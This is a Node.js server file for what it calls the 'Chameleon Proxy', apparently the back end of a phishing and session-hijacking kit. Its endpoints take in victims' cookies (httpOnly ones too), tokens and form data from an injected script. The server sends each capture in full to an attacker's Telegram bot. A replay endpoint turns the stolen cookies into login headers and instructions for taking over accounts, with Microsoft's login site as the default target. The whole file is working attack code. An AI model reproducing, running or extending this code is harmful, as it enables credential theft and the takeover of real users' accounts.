const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
const zlib = require('zlib');
require('dotenv').config();

// ============================================================
//  COMPLETE SESSION STORAGE - NO TRUNCATION
// ============================================================

class SessionStore {
    constructor() {
        this.sessions = new Map();
        this.sessionTTL = 60 * 60 * 1000; // 1 hour
        this.replayData = new Map();
        this.allCookies = new Map();
    }

    // Store complete session data - no truncation
    storeSession(sessionId, data) {
        const session = this.sessions.get(sessionId) || {
            id: sessionId,
            created: Date.now(),
            lastActivity: Date.now(),
            data: {}
        };
        
        // Merge data without truncation
        session.data = this.deepMerge(session.data, data);
        session.lastActivity = Date.now();
        
        this.sessions.set(sessionId, session);
        return session;
    }

    // Store cookies - full values, no truncation
    storeCookies(sessionId, cookies, source) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.cookies = session.cookies || {};
        session.cookies[source] = session.cookies[source] || [];
        
        // Store each cookie with full value
        for (const [name, cookieData] of Object.entries(cookies)) {
            // Check if cookie already exists
            const existing = session.cookies[source].find(c => c.name === name);
            if (existing) {
                // Update with full value - no truncation
                existing.value = cookieData.value;
                existing.httpOnly = cookieData.httpOnly;
                existing.updated = Date.now();
            } else {
                session.cookies[source].push({
                    name: name,
                    value: cookieData.value, // Full value, no truncation
                    httpOnly: cookieData.httpOnly || false,
                    secure: cookieData.secure || false,
                    path: cookieData.path || '/',
                    domain: cookieData.domain || '',
                    captured: Date.now(),
                    source: source
                });
            }
        }
        
        // Store in global cookie map for easy access
        this.allCookies.set(sessionId, session.cookies);
    }

    // Store complete form data - no truncation
    storeFormData(sessionId, formData) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.forms = session.forms || [];
        session.forms.push({
            data: formData, // Full data, no truncation
            timestamp: Date.now(),
            url: formData.url || 'unknown'
        });
    }

    // Store tokens - full values, no truncation
    storeTokens(sessionId, tokens) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.tokens = session.tokens || {};
        for (const [key, value] of Object.entries(tokens)) {
            if (value) {
                session.tokens[key] = {
                    value: value, // Full token, no truncation
                    captured: Date.now()
                };
            }
        }
    }

    // Store replay data - complete
    storeReplayData(sessionId, replayData) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.replayData = replayData;
        this.replayData.set(sessionId, replayData);
    }

    // Get complete session for replay
    getReplayData(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        return {
            sessionId: session.id,
            cookies: session.cookies || {},
            tokens: session.tokens || {},
            forms: session.forms || [],
            replayData: session.replayData || {},
            fingerprint: session.fingerprint || {},
            created: session.created,
            lastActivity: session.lastActivity
        };
    }

    // Get all cookies for session
    getAllCookies(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        
        const allCookies = {};
        
        // Combine all cookie sources
        if (session.cookies) {
            for (const source of Object.values(session.cookies)) {
                if (Array.isArray(source)) {
                    for (const cookie of source) {
                        allCookies[cookie.name] = cookie.value; // Full value
                    }
                }
            }
        }
        
        return allCookies;
    }

    // Deep merge helper
    deepMerge(target, source) {
        const result = { ...target };
        for (const [key, value] of Object.entries(source)) {
            if (value && typeof value === 'object' && !Array.isArray(value)) {
                result[key] = this.deepMerge(target[key] || {}, value);
            } else {
                result[key] = value; // Keep full value
            }
        }
        return result;
    }

    // Cleanup expired sessions
    cleanup() {
        const now = Date.now();
        let cleaned = 0;
        for (const [id, session] of this.sessions) {
            if (now - session.lastActivity > this.sessionTTL) {
                this.sessions.delete(id);
                this.replayData.delete(id);
                cleaned++;
            }
        }
        if (cleaned > 0) {
            console.log(`[CLEANUP] 🧹 Removed ${cleaned} expired sessions`);
        }
    }
}

const sessionStore = new SessionStore();

// ============================================================
//  COMPLETE SERVER
// ============================================================

const server = http.createServer(async (req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    // ============================================================
    //  COOKIE CAPTURE ENDPOINTS
    // ============================================================

    // Capture cookies from frontend
    if (req.url === '/api/cookies' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromHeaders(req);
                
                if (sessionId) {
                    // Store full cookies - no truncation
                    sessionStore.storeCookies(sessionId, data.cookies, data.source || 'api');
                    
                    // Also send to Telegram with full cookie data
                    await sendTelegramCookieAlert(sessionId, data.cookies);
                    
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ 
                        success: true, 
                        message: 'Cookies stored successfully',
                        count: Object.keys(data.cookies).length
                    }));
                } else {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                }
            } catch(e) {
                console.error('[COOKIES] Error:', e);
                res.writeHead(500);
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }

    // ============================================================
    //  FORM DATA CAPTURE ENDPOINTS
    // ============================================================

    if (req.url === '/api/form-data' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromHeaders(req);
                
                if (sessionId) {
                    sessionStore.storeFormData(sessionId, data);
                    
                    // Send Telegram alert with full form data
                    await sendTelegramFormAlert(sessionId, data);
                    
                    res.writeHead(200);
                    res.end(JSON.stringify({ success: true }));
                } else {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                }
            } catch(e) {
                console.error('[FORM] Error:', e);
                res.writeHead(500);
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }

    // ============================================================
    //  TOKEN CAPTURE ENDPOINTS
    // ============================================================

    if (req.url === '/api/tokens' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromHeaders(req);
                
                if (sessionId) {
                    sessionStore.storeTokens(sessionId, data.tokens);
                    
                    // Send Telegram alert with tokens
                    await sendTelegramTokenAlert(sessionId, data.tokens);
                    
                    res.writeHead(200);
                    res.end(JSON.stringify({ success: true }));
                } else {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                }
            } catch(e) {
                console.error('[TOKENS] Error:', e);
                res.writeHead(500);
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }

    // ============================================================
    //  REPLAY DATA ENDPOINTS
    // ============================================================

    if (req.url === '/api/replay-data' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromHeaders(req);
                
                if (sessionId) {
                    sessionStore.storeReplayData(sessionId, data);
                    
                    res.writeHead(200);
                    res.end(JSON.stringify({ 
                        success: true,
                        sessionId: sessionId
                    }));
                } else {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                }
            } catch(e) {
                console.error('[REPLAY] Error:', e);
                res.writeHead(500);
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }

    // ============================================================
    //  GET COMPLETE SESSION DATA FOR REPLAY
    // ============================================================

    if (req.url === '/api/session-data' && req.method === 'GET') {
        const sessionId = req.headers['x-session-id'] || getSessionIdFromHeaders(req);
        
        if (sessionId) {
            const data = sessionStore.getReplayData(sessionId);
            if (data) {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(data, null, 2));
            } else {
                res.writeHead(404);
                res.end(JSON.stringify({ error: 'Session not found' }));
            }
        } else {
            res.writeHead(400);
            res.end(JSON.stringify({ error: 'No session ID' }));
        }
        return;
    }

    // ============================================================
    //  GET ALL COOKIES FOR SESSION
    // ============================================================

    if (req.url === '/api/cookies/all' && req.method === 'GET') {
        const sessionId = req.headers['x-session-id'] || getSessionIdFromHeaders(req);
        
        if (sessionId) {
            const cookies = sessionStore.getAllCookies(sessionId);
            if (cookies) {
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify(cookies, null, 2));
            } else {
                res.writeHead(404);
                res.end(JSON.stringify({ error: 'No cookies found' }));
            }
        } else {
            res.writeHead(400);
            res.end(JSON.stringify({ error: 'No session ID' }));
        }
        return;
    }

    // ============================================================
    //  SESSION REPLAY - USE COOKIES TO ACCESS ACCOUNT
    // ============================================================

    if (req.url === '/api/replay' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const data = JSON.parse(body);
                const sessionId = data.sessionId || getSessionIdFromHeaders(req);
                
                if (!sessionId) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'No session ID' }));
                    return;
                }
                
                const sessionData = sessionStore.getReplayData(sessionId);
                if (!sessionData) {
                    res.writeHead(404);
                    res.end(JSON.stringify({ error: 'Session not found' }));
                    return;
                }
                
                // Build replay URL with all cookies
                const cookies = sessionStore.getAllCookies(sessionId);
                const target = data.target || 'https://login.microsoftonline.com';
                
                // Create cookie header
                const cookieHeader = Object.entries(cookies)
                    .map(([name, value]) => `${name}=${value}`)
                    .join('; ');
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({
                    success: true,
                    sessionId: sessionId,
                    target: target,
                    cookies: cookies,
                    cookieHeader: cookieHeader,
                    replayUrl: `${target}?session_replay=true`,
                    instructions: [
                        '1. Use the cookieHeader below to authenticate',
                        '2. Use the cookies object for manual replay',
                        '3. Access the target URL with the cookies'
                    ]
                }, null, 2));
                
            } catch(e) {
                console.error('[REPLAY] Error:', e);
                res.writeHead(500);
                res.end(JSON.stringify({ error: e.message }));
            }
        });
        return;
    }

    // ============================================================
    //  HEALTH CHECK
    // ============================================================

    if (req.url === '/health' || req.url === '/api/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({
            status: 'healthy',
            timestamp: new Date().toISOString(),
            sessions: sessionStore.sessions.size,
            totalCookies: Array.from(sessionStore.sessions.values())
                .reduce((acc, s) => acc + (s.cookies ? Object.keys(s.cookies).length : 0), 0),
            replayData: sessionStore.replayData.size,
            version: '2.0.0-cookie-capture'
        }, null, 2));
        return;
    }

    // ============================================================
    //  DEFAULT - SERVE FRONTEND
    // ============================================================

    if (req.url === '/' || req.url === '/index.html') {
        serveFile(path.join(__dirname, '../frontend', 'index.html'), res);
        return;
    }

    if (req.url === '/inject.js') {
        serveFile(path.join(__dirname, '../frontend', 'script_inject.js'), res, 'text/javascript');
        return;
    }

    if (req.url === '/style.css') {
        serveFile(path.join(__dirname, '../frontend', 'style.css'), res, 'text/css');
        return;
    }

    // Default response
    res.writeHead(404);
    res.end('Not found');
});

// ============================================================
//  TELEGRAM ALERTS WITH FULL DATA
// ============================================================

async function sendTelegramCookieAlert(sessionId, cookies) {
    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        if (!botToken || !chatId) return;

        let msg = `🍪 *FULL COOKIES CAPTURED*\n\n`;
        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
        msg += `*📊 Total:* ${Object.keys(cookies).length} cookies\n\n`;
        
        msg += `*📝 COOKIES (FULL VALUES - NO TRUNCATION):*\n`;
        for (const [name, data] of Object.entries(cookies)) {
            const value = data.value || data;
            const httpOnly = data.httpOnly ? '🔒' : '🔓';
            msg += `  ${httpOnly} \`${name}\`:\n`;
            msg += `  \`${value}\`\n\n`;
        }

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: msg,
                parse_mode: 'Markdown'
            })
        });
        
        console.log(`[TELEGRAM] ✅ Cookie alert sent for session ${sessionId.substring(0, 16)}`);
    } catch(e) {
        console.error('[TELEGRAM] Error:', e);
    }
}

async function sendTelegramTokenAlert(sessionId, tokens) {
    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        if (!botToken || !chatId) return;

        let msg = `🎟️ *TOKENS CAPTURED*\n\n`;
        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n\n`;
        
        for (const [key, value] of Object.entries(tokens)) {
            if (value) {
                msg += `*${key}:*\n`;
                const tokenValue = typeof value === 'object' ? value.value : value;
                msg += `\`${tokenValue}\`\n\n`;
            }
        }

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: msg,
                parse_mode: 'Markdown'
            })
        });
        
        console.log(`[TELEGRAM] ✅ Token alert sent for session ${sessionId.substring(0, 16)}`);
    } catch(e) {
        console.error('[TELEGRAM] Error:', e);
    }
}

async function sendTelegramFormAlert(sessionId, data) {
    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        if (!botToken || !chatId) return;

        let msg = `📝 *COMPLETE FORM DATA CAPTURED*\n\n`;
        msg += `*🆔 Session:* \`${sessionId.substring(0, 16)}...\`\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
        msg += `*🔗 URL:* ${data.url || 'unknown'}\n\n`;
        
        msg += `*📋 FORM DATA (FULL - NO TRUNCATION):*\n`;
        for (const [key, value] of Object.entries(data.formData || {})) {
            msg += `  *${key}:*\n  \`${value}\`\n\n`;
        }

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: msg,
                parse_mode: 'Markdown'
            })
        });
        
        console.log(`[TELEGRAM] ✅ Form alert sent for session ${sessionId.substring(0, 16)}`);
    } catch(e) {
        console.error('[TELEGRAM] Error:', e);
    }
}

// ============================================================
//  HELPERS
// ============================================================

function getSessionIdFromHeaders(req) {
    // Check cookie header
    const cookieHeader = req.headers.cookie || '';
    const cookies = cookieHeader.split(';').map(c => c.trim());
    for (const cookie of cookies) {
        const [name, value] = cookie.split('=');
        if (name === 'sessionId') {
            return value;
        }
    }
    
    // Check headers
    return req.headers['x-session-id'] || null;
}

function serveFile(filePath, res, contentType = 'text/html') {
    fs.readFile(filePath, (err, data) => {
        if (err) {
            res.writeHead(404);
            res.end('File not found');
            return;
        }
        res.writeHead(200, { 
            'Content-Type': contentType,
            'Cache-Control': 'no-store'
        });
        res.end(data);
    });
}

// ============================================================
//  START SERVER
// ============================================================

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║                                                           ║');
    console.log('║     🍪  CHAMELEON PROXY - FULL COOKIE CAPTURE           ║');
    console.log('║     🔐  Complete Session Replay Data                     ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║                                                           ║');
    console.log(`║   📍 Server:    http://localhost:${PORT}                   ║`);
    console.log('║   🍪 Cookie Capture: ENABLED (NO TRUNCATION)            ║');
    console.log('║   🎟️ Token Capture: ENABLED (NO TRUNCATION)             ║');
    console.log('║   📝 Form Capture: ENABLED (NO TRUNCATION)              ║');
    console.log('║   🔄 Session Replay: ENABLED                            ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║                                                           ║');
    console.log('║   📊 Endpoints:                                         ║');
    console.log(`║   POST /api/cookies - Store cookies                     ║`);
    console.log(`║   POST /api/tokens - Store tokens                       ║`);
    console.log(`║   POST /api/form-data - Store form data                 ║`);
    console.log(`║   POST /api/replay-data - Store replay data             ║`);
    console.log(`║   GET /api/cookies/all - Get all cookies                ║`);
    console.log(`║   GET /api/session-data - Get complete session          ║`);
    console.log(`║   POST /api/replay - Replay session                    ║`);
    console.log('║                                                           ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
});

// ============================================================
//  CLEANUP
// ============================================================

setInterval(() => {
    sessionStore.cleanup();
}, 300000);